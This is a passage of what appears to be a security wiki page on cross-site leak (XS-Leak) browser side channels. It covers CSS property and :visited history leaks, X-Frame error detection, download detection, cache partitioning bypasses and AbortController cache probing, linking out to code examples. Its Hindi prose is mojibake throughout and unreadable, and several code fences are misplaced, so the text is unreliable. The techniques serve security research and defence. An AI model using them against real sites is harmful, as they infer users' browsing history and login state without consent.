* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ **рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реНрдЯрд╛рдЗрд▓рд┐рдВрдЧ рдмрджрд▓ рд╕рдХрддреА рд╣реИ**ред рдХреНрд░реЙрд╕-рдСрд░рд┐рдЬрд┐рди CSS рдлрд╝рд╛рдЗрд▓реЗрдВ HTML рд▓рд┐рдВрдХ рддрддреНрд╡ рдХреЗ рд╕рд╛рде рд╣рдорд▓рд╛рд╡рд░ рдкреГрд╖реНрда рдкрд░ рд╕рдореНрдорд┐рд▓рд┐рдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ, рдФрд░ рдирд┐рдпрдореЛрдВ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдкреГрд╖реНрда рдкрд░ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдпрджрд┐ рдХреЛрдИ рдкреГрд╖реНрда рдЗрди рдирд┐рдпрдореЛрдВ рдХреЛ рдбрд╛рдпрдирд╛рдорд┐рдХ рд░реВрдк рд╕реЗ рдмрджрд▓рддрд╛ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реНрдерд┐рддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЗрди рднрд┐рдиреНрдирддрд╛рдУрдВ рдХреЛ **рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ**ред\
рдПрдХ рд▓реАрдХ рддрдХрдиреАрдХ рдХреЗ рд░реВрдк рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ `window.getComputedStyle` рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рд╡рд┐рд╢рд┐рд╖реНрдЯ HTML рддрддреНрд╡ рдХреЗ CSS рдЧреБрдгреЛрдВ рдХреЛ **рдкрдврд╝ рд╕рдХрддрд╛ рд╣реИ**ред рдЗрд╕ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдпрджрд┐ рдкреНрд░рднрд╛рд╡рд┐рдд рддрддреНрд╡ рдФрд░ рдЧреБрдг рдХрд╛ рдирд╛рдо рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рд╡рд┐рдЪрд╛рд░рд╛рддреНрдордХ CSS рдЧреБрдг рдкрдврд╝ рд╕рдХрддрд╛ рд╣реИред

### CSS рдЗрддрд┐рд╣рд╛рд╕

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**: HTML рддрддреНрд╡
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдЕрдВрддрд░**: рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ `:visited` рд╕реНрдЯрд╛рдЗрд▓ рдПрдХ URL рдкрд░ рд▓рд╛рдЧреВ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдкрддрд╛ рдЪрд▓реЗ рдХрд┐ рдпрд╣ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рджреЗрдЦрд╛ рдЧрдпрд╛ рдерд╛
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
[**рдЗрд╕**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдпрд╣ headless Chrome рдореЗрдВ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИред
{% endhint %}

CSS `:visited` рдЪрдпрдирдХрд░реНрддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрди URLs рдХреЛ рд╡рд┐рднрд┐рдиреНрди рдврдВрдЧ рд╕реЗ рд╕рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рджреЗрдЦреЗ рдЧрдП рд╣реИрдВред рдкрд╣рд▓реЗ, `getComputedStyle()` рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЗрди рд╕реНрдЯрд╛рдЗрд▓ рднрд┐рдиреНрдирддрд╛рдУрдВ рдХреЛ рдкрд╣рдЪрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдзреБрдирд┐рдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЗрд╕ рд╡рд┐рдзрд┐ рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдВрдХ рдХреА рд╕реНрдерд┐рддрд┐ рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рд▓реЗрдХрд░ рдЖрдП рд╣реИрдВред рдЗрди рдЙрдкрд╛рдпреЛрдВ рдореЗрдВ рд╣рдореЗрд╢рд╛ рд▓рд┐рдВрдХ рдХреЛ рдпрджрд┐ рд╡рд╣ рджреЗрдЦрд╛ рдЧрдпрд╛ рд╣реЛ рддреЛ рд╣рдореЗрд╢рд╛ рдХрдВрдкреНрдпреВрдЯреЗрдб рд╕реНрдЯрд╛рдЗрд▓ рдХреЛ рд▓реМрдЯрд╛рдирд╛ рдФрд░ `:visited` рдЪрдпрдирдХрд░реНрддрд╛ рдХреЗ рд╕рд╛рде рд▓рд╛рдЧреВ рдХрд┐рдП рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рд╢реИрд▓рд┐рдпреЛрдВ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рди
### ContentDocument X-Frame рд▓реАрдХ

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдореНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╣реЗрдбрд░реНрд╕
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **рд╕рд╛рд░рд╛рдВрд╢:** Google Chrome рдореЗрдВ, рдПрдХ рд╡рд┐рд╢реЗрд╖ рддреНрд░реБрдЯрд┐ рдкреГрд╖реНрда рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрдм X-Frame-Options рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЗ рдХрд╛рд░рдг рдХрд┐рд╕реА рдкреГрд╖реНрда рдХреЛ рдкрд╛рд░-рд╕реНрдерд┐рддрд┐ рд╕рд╛рдЗрдЯ рдкрд░ рд╕рдорд╛рд╣рд┐рдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)
### рдбрд╛рдЙрдирд▓реЛрдб рдбрд┐рдЯреЗрдХреНрд╢рди

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдо, рдкреЙрдк-рдЕрдк
* **рд╕рдВрдХреЗрддрдиреАрдп рдЕрдВрддрд░**: рд╣реЗрдбрд░реНрд╕
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдПрдХ рд╣рдорд▓рд╛рд╡рд╛рджреА рдЖрдИрдлреНрд░реЗрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХреЛ рдкрд╣рдЪрд╛рди рд╕рдХрддрд╛ рд╣реИ; рдЖрдИрдлреНрд░реЗрдо рдХреА рдЬрд╛рд░реА рд░рд╣рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╕рдлрд▓ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд╛ рд╕реВрдЪрд┐рдд рдХрд░рддреА рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)
```
`Content-Disposition` рд╣реЗрдбрд░, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ `Content-Disposition: attachment`, рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп рдЗрдирд▓рд╛рдЗрди рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдПрдХ рдкреГрд╖реНрда рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИред Chromium-рдЖрдзрд╛рд░рд┐рдд рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ, рдЗрд╕ рдбрд╛рдЙрдирд▓реЛрдб рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рддрдХрдиреАрдХ рд╣реИрдВ:

1. **рдбрд╛рдЙрдирд▓реЛрдб рдмрд╛рд░ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ**:
* рдЬрдм рдХреЛрдИ рдлрд╝рд╛рдЗрд▓ Chromium-рдЖрдзрд╛рд░рд┐рдд рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рд╣реЛрддреА рд╣реИ, рддреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╡рд┐рдВрдбреЛ рдХреЗ рдиреАрдЪреЗ рдПрдХ рдбрд╛рдЙрдирд▓реЛрдб рдмрд╛рд░ рдкреНрд░рдХрдЯ рд╣реЛрддрд╛ рд╣реИред
* рд╡рд┐рдВрдбреЛ рдКрдБрдЪрд╛рдИ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХрд╛ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ рдХрд░рдХреЗ рд╣рдорд▓рд╛рд╡рд░ рдбрд╛рдЙрдирд▓реЛрдб рдмрд╛рд░ рдХреЗ рдкреНрд░рдХрдЯ рд╣реЛрдиреЗ рдХрд╛ рдЕрдВрджрд╛рдЬрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдкреНрд░рд╕реНрддреБрддрд┐ рд╣реЛрддреА рд╣реИ рдХрд┐ рдПрдХ рдбрд╛рдЙрдирд▓реЛрдб рдкреНрд░рд╛рд░рдВрдн рд╣реЛ рдЧрдпрд╛ рд╣реИред
2. **рдЖрдЗрдлреНрд░реЗрдо рдХреЗ рд╕рд╛рде рдбрд╛рдЙрдирд▓реЛрдб рдиреЗрд╡рд┐рдЧреЗрд╢рди**:
* рдЬрдм рдПрдХ рдкреГрд╖реНрда `Content-Disposition: attachment` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдХрд┐рд╕реА рдиреЗрд╡рд┐рдЧреЗрд╢рди рдШрдЯрдирд╛ рдХрд╛ рдХрд╛рд░рдг рдирд╣реАрдВ рдмрдирд╛рддрд╛ред
* рдЖрдЗрдлреНрд░реЗрдо рдореЗрдВ рд╕рд╛рдордЧреНрд░реА рд▓реЛрдб рдХрд░рдХреЗ рдФрд░ рдиреЗрд╡рд┐рдЧреЗрд╢рди рдШрдЯрдирд╛рдУрдВ рдХрд╛ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ рдХрд░рдХреЗ, рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рд╕рд╛рдордЧреНрд░реА рд╡рд┐рдиреНрдпрд╛рд╕ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИ (рдХреЛрдИ рдиреЗрд╡рд┐рдЧреЗрд╢рди рдирд╣реАрдВ) рдпрд╛ рдирд╣реАрдВред
3. **рдЖрдЗрдлреНрд░реЗрдо рдХреЗ рдмрд┐рдирд╛ рдбрд╛рдЙрдирд▓реЛрдб рдиреЗрд╡рд┐рдЧреЗрд╢рди**:
* рдЖрдЗрдлреНрд░реЗрдо рддрдХрдиреАрдХ рдХреЗ рд╕рдорд╛рди, рдЗрд╕ рд╡рд┐рдзрд┐ рдореЗрдВ `window.open` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЖрдЗрдлреНрд░реЗрдо рдХреЗ рдмрдЬрд╛рдпред
* рдирдП рдЦреБрд▓реЗ рд╡рд┐рдВрдбреЛ рдореЗрдВ рдиреЗрд╡рд┐рдЧреЗрд╢рди рдШрдЯрдирд╛рдУрдВ рдХрд╛ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ рдХрд░рдХреЗ рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ (рдХреЛрдИ рдиреЗрд╡рд┐рдЧреЗрд╢рди) рдпрд╛ рдпрджрд┐ рд╕рд╛рдордЧреНрд░реА рдЗрдирд▓рд╛рдЗрди рдкреНрд░рджрд░реНрд╢рд┐рдд рдХреА рдЧрдИ рд╣реИ (рдиреЗрд╡рд┐рдЧреЗрд╢рди рд╣реЛрддрд╛ рд╣реИ)ред

рдЙрди рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдБ рдХреЗрд╡рд▓ рд▓реЙрдЧ-рдЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдПрдВ рдРрд╕реА рдбрд╛рдЙрдирд▓реЛрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреА рд╣реИрдВ, рдЗрди рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕реНрдерд┐рддрд┐ рдХрд╛ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдЕрдВрджрд╛рдЬрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### рд╡рд┐рднрд╛рдЬрд┐рдд HTTP рдХреИрд╢ рдмрд╛рдЗрдкрд╛рд╕ <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>
```
* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдкреЙрдк-рдЕрдкреНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╕рдордп
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдлрд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХреЛ iframes рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд╣рдЪрд╛рди рд╕рдХрддрд╛ рд╣реИ; iframe рдХреА рдЬрд╛рд░реА рд░рд╣рдиреЗ рдХрд╛ рдЕрд░реНрде рд╕рдлрд▓ рдлрд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (рд╕реЗ [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
рдпрд╣ рддрдХрдиреАрдХ рдХреНрдпреЛрдВ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ: Chrome рдЕрдм **рдХреИрд╢ рдкрд╛рд░реНрдЯреАрд╢рдирд┐рдВрдЧ** рд░рдЦрддрд╛ рд╣реИ, рдФрд░ рдирдП рдЦреБрд▓реЗ рдкреГрд╖реНрда рдХреА рдХреИрд╢ рдХреБрдВрдЬреА рд╣реИ: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдореИрдВ рдПрдХ ngrok рдкреГрд╖реНрда рдЦреЛрд▓рддрд╛ рд╣реВрдВ рдФрд░ рдЙрд╕рдореЗрдВ fetch рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реВрдВ, рддреЛ рдХреИрд╢ рдХреБрдВрдЬреА рд╣реЛрдЧреА: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, **рдХреИрд╢ рдХреБрдВрдЬреА рдЕрд▓рдЧ рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдХреИрд╢ рд╕рд╛рдЭрд╛ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ред рдЖрдк рдпрд╣рд╛рдБ рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [рдХреИрд╢ рдХреЛ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдФрд░ рдЧреЛрдкрдиреАрдпрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛](https://developer.chrome.com/blog/http-cache-partitioning/)\
(рдЯрд┐рдкреНрдкрдгреА рд╕реЗ [**рдпрд╣рд╛рдБ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

рдпрджрд┐ рд╕рд╛рдЗрдЯ `example.com` `*.example.com/resource` рд╕реЗ рд╕рдВрд╕рд╛рдзрд┐рдд рд╕рдВрд╕рд╛рдзрди рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИ рддреЛ рдЙрд╕ рд╕рдВрд╕рд╛рдзрди рдХреА **рд╡рд╣реА рдХреИрд╢рд┐рдВрдЧ рдХреБрдВрдЬреА** рд╣реЛрдЧреА рдЬреИрд╕реЗ рдЕрдЧрд░ рд╕рдВрд╕рд╛рдзрди рдХреЛ рд╕реАрдзреЗ **рд╢реАрд░реНрд╖-рд╕реНрддрд░реАрдп рдиреЗрд╡рд┐рдЧреЗрд╢рди** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реАрдзреЗ рдЕрдиреБрд░реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдЗрд╕рд▓рд┐рдП рдХреИрд╢рд┐рдВрдЧ рдХреБрдВрдЬреА рд╢реАрд░реНрд╖-рд╕реНрддрд░реАрдп _eTLD+1_ рдФрд░ рдлреНрд░реЗрдо _eTLD+1_ рд╕реЗ рдмрдиреА рд╣реЛрддреА рд╣реИред

рдХреНрдпреЛрдВрдХрд┐ рдХреИрд╢ рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рддреЗрдЬ рд╣реИ, рдЗрд╕реЗ рдкреГрд╖реНрда рдХреА рд╕реНрдерд╛рдирд╛рдВрддрд░рдг рдХреЛ рдмрджрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдФрд░ рдЗрд╕реЗ 20 рдорд┐рд▓реАрд╕реЗрдХрдВрдб (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП) рдмрд╛рдж рд░рджреНрдж рдХрд░рдиреЗ рдХрд╛ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИред рдпрджрд┐ рд░реЛрдХрдиреЗ рдХреЗ рдмрд╛рдж рдореВрд▓ рдмрджрд▓ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рд╕рдВрд╕рд╛рдзрд┐рдд рд╕рдВрд╕рд╛рдзрди рдерд╛ред\
рдпрд╛ рдмрд╕ **рдХреБрдЫ fetch рднреЗрдЬреЗрдВ рдЬрд┐рд╕реЗ рд╕рдВрд╕рд╛рдзрд┐рдд рдкреГрд╖реНрда рдкрд░ рднреЗрдЬрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ рдпрд╣ рдорд╛рдкреЗрдВ рдХрд┐ рдпрд╣ рдХрд┐рддрдирд╛ рд╕рдордп рд▓реЗрддрд╛ рд╣реИ**ред

### рдореИрдиреБрдЕрд▓ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**: Fetch API
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдПрдХ рдлреЗрдЪ рдЕрдиреБрд░реЛрдз рдХреЗ рдкреНрд░рддрд┐рд╕рд╛рдж рдХрд╛ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рдг рд╣реИ
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**:

![](<../../.gitbook/assets/image (769).png>)

### рдПрдмреЙрд░реНрдЯрдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЗ рд╕рд╛рде рдлреЗрдЪ <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**: Fetch API
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╕рдордп
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдПрдХ рд╕рдВрд╕рд╛рдзрд┐рдд рд╕рдВрд╕рд╛рдзрди рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛рдП рдФрд░ рдЬрдм рдпрд╣ рд▓реЛрдб рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд░реЛрдХрд╛ рдЬрд╛рдПред рдпрджрд┐ рдХреЛрдИ рддреНрд░реБрдЯрд┐ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддреА рд╣реИ, рддреЛ рд╕рдВрд╕рд╛рдзрди рд╕рдВрд╕рд╛рдзрд┐рдд рдерд╛ рдпрд╛ рдирд╣реАрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

рдПрдХ **AbortController** рдХреЗ рд╕рд╛рде _**fetch**_ рдФрд░ _**setTimeout**_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЖрдк рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХреЗрдВ рдХрд┐ **рд╕рдВрд╕рд╛рдзрд┐рдд рд╕рдВрд╕рд╛рдзрди рд╣реИ** рдФрд░ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреИрд╢ рд╕реЗ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕рдВрд╕рд╛рдзрди рдХреЛ рдирд┐рдХрд╛рд▓реЗрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдирдП рд╕рд╛рдордЧреНрд░реА рдХреЛ рдХреИрд╢рд┐рдВрдЧ рдХрд┐рдП рдмрд┐рдирд╛ рд╣реЛрддреА рд╣реИред
### рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкреЛрд▓реНрдпреВрд╢рди

* **рд╕рдорд╛рд╡реЗрд╢ рд╡рд┐рдзрд┐рдпрд╛рдБ**: HTML рддрддреНрд╡ (рд╕реНрдХреНрд░рд┐рдкреНрдЯ)
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдореЗрдВ рдЕрдВрддрд░**: рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
